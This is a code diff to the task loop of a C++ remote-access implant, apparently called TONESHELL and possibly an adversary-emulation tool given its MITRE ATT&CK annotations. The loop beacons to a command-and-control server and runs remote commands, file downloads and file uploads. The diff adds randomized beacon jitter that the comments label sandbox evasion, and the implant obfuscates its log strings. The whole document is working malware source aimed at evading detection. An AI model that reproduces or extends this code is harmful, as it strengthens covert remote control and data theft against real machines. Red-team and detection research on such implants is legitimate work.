@@ -4,11 +4,12 @@
 #include "shellcode_util.hpp"
 #include "util.hpp"
 #include "exec.hpp"
+#include "prng.hpp"
 #include <al/al.hpp>
+#include <intrin.h>
 #include <string_view>
 
 #define HEAP_SIZE 1024*1024 // 1MB
-#define DEFAULT_SLEEP_MS 10000
 
 using namespace al;
 
@@ -180,34 +181,73 @@ unsigned int entry() {
 }
 
 /*
+ * ComputeJitter:
+ *      About:
+ *          Returns a pseudo-random sleep duration from the Active or Idle bucket.
+ *          Active bucket (1-3s) is used when the server just sent a real task;
+ *          Idle bucket (5-30s) is used for keep-alive beacons when no task is pending.
+ *          Values are configured via CMake cache variables at build time.
+ *      MITRE ATT&CK Techniques:
+ *          T1029 — Scheduled Transfer (adaptive jitter)
+ *          T1497.003 — Virtualization/Sandbox Evasion: Time Based Evasion
+ */
+static uint32_t ComputeJitter(xorshift64_state* p, bool active) {
+    if (active) {
+        return TONESHELL_JITTER_ACTIVE_MIN_MS
+             + (uint32_t)(xorshift64_next(p) % (TONESHELL_JITTER_ACTIVE_MAX_MS - TONESHELL_JITTER_ACTIVE_MIN_MS));
+    }
+    return TONESHELL_JITTER_IDLE_MIN_MS
+         + (uint32_t)(xorshift64_next(p) % (TONESHELL_JITTER_IDLE_MAX_MS - TONESHELL_JITTER_IDLE_MIN_MS));
+}
+
+/*
  * PerformTaskLoop:
  *      About:
  *          Repeatedly beacons to the C2 server to request tasking
- *          and processes C2 responses.
+ *          and processes C2 responses. Uses 2-tier adaptive jitter
+ *          to vary beacon cadence: Active (1-3s) when a real task
+ *          was just received, Idle (5-30s) for keep-alive beacons.
+ *          An immediate follow-up beacon (delay=0) fires after
+ *          task completion to create burst behavior.
  *      MITRE ATT&CK Techniques:
  *          T1095: Non-Application Layer Protocol
  *          T1106: Native API
+ *          T1029: Scheduled Transfer
+ *          T1497.003: Virtualization/Sandbox Evasion: Time Based Evasion
  */
 void PerformTaskLoop(sh_context* ctx, client_message* msg_buf, server_response* resp_buf) {
     DWORD result;
+    xorshift64_state prng;
+    uint64_t nextSend = 0;
+    bool seeded = false;
+
     while (true) {
-        ctx->fp.fp_Sleep(DEFAULT_SLEEP_MS);
+        if (!seeded) {
+            uint64_t seed = __rdtsc() ^ ctx->fp.fp_GetTickCount64();
+            xorshift64_seed(&prng, seed);
+            seeded = true;
+        }
+
+        uint64_t now = ctx->fp.fp_GetTickCount64();
+        if (nextSend > now) {
+            uint64_t remaining = nextSend - now;
+            ctx->fp.fp_Sleep((DWORD)remaining);
+        }
 
         AesLogger::LogDebug(&(ctx->log_ctx), "Sending beacon."_xor);
         result = PerformBeacon(ctx, msg_buf, resp_buf);
+        bool had_task = false;
+
         if (result != ERROR_SUCCESS) {
             AesLogger::LogError(&(ctx->log_ctx), "Beacon failure. Error code: %d"_xor, result);
-            continue;
-        }
-
-        if (resp_buf->resp_type == RESP_TYPE_EXEC_CMD) {
-            // Handle command execution
+            had_task = false;
+        } else if (resp_buf->resp_type == RESP_TYPE_EXEC_CMD) {
             AesLogger::LogDebug(&(ctx->log_ctx), "Received process execution instruction."_xor);
             result = PerformExecTask(ctx, msg_buf, resp_buf, reinterpret_cast<task_command_data*>(resp_buf->data));
             if (result != ERROR_SUCCESS) {
                 AesLogger::LogError(&(ctx->log_ctx), "Process execution task failure. Error code: %d"_xor, result);
-                continue;
             }
+            had_task = true;
         } else if (resp_buf->resp_type == RESP_TYPE_FILE_DOWNLOAD) {
             AesLogger::LogDebug(&(ctx->log_ctx), "Received file download instruction."_xor);
             result = PerformFileDownloadTask(ctx, msg_buf, resp_buf);
@@ -216,7 +256,7 @@ void PerformTaskLoop(sh_context* ctx, client_message* msg_buf, server_response* 
             } else {
                 AesLogger::LogInfo(&(ctx->log_ctx), "Successfully downloaded file."_xor);
             }
-            continue;
+            had_task = true;
         } else if (resp_buf->resp_type == RESP_TYPE_FILE_UPLOAD) {
             AesLogger::LogDebug(&(ctx->log_ctx), "Received file upload instruction."_xor);
             task_start_upload_data task_data;
@@ -227,10 +267,10 @@ void PerformTaskLoop(sh_context* ctx, client_message* msg_buf, server_response* 
             } else {
                 AesLogger::LogInfo(&(ctx->log_ctx), "Successfully uploaded file."_xor);
             }
-            continue;
+            had_task = true;
         } else if (resp_buf->resp_type == RESP_TYPE_IDLE) {
             AesLogger::LogDebug(&(ctx->log_ctx), "Received idle instruction."_xor);
-            continue;
+            had_task = false;
         } else if (resp_buf->resp_type == RESP_TYPE_TERMINATE) {
             AesLogger::LogDebug(&(ctx->log_ctx), "Received termination instruction."_xor);
             return;
@@ -242,9 +282,16 @@ void PerformTaskLoop(sh_context* ctx, client_message* msg_buf, server_response* 
                 break;
             }
             AesLogger::LogSuccess(&(ctx->log_ctx), "Reconnect success."_xor);
+            had_task = true;
         } else {
             AesLogger::LogError(&(ctx->log_ctx), "Unsupported beacon response code: %d"_xor, resp_buf->resp_type);
-            continue;
+            had_task = false;
+        }
+
+        if (had_task) {
+            nextSend = 0;
+        } else {
+            nextSend = ctx->fp.fp_GetTickCount64() + ComputeJitter(&prng, false);
         }
     }
 }
